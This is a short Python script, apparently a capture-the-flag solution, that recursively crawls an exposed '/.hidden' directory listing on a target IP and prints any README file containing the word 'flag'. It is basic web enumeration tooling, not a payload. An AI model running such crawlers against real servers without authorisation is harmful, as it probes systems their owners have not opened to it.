import requests, sys
import urllib.request
from bs4 import BeautifulSoup

def directory_listing(url):
	response = requests.get(url)
	soup = BeautifulSoup(response.text, "lxml")
	for link in soup.find_all('a'):
		if link.get('href') == "README" :
			f = urllib.request.urlopen(url + '/' + link.get('href'))
			myfile = f.read().decode('utf-8')
			if "flag" in myfile:
				print(myfile)
			break
		elif link.get('href') != "../":
			directory_listing(url + '/' + link.get('href'))
	
def main():
	if len(sys.argv) != 2:
		print("Usage: python script.py <ip>")
		sys.exit(1)
	directory_listing("http://" + sys.argv[1] + "/.hidden")

if __name__ == "__main__":
	main()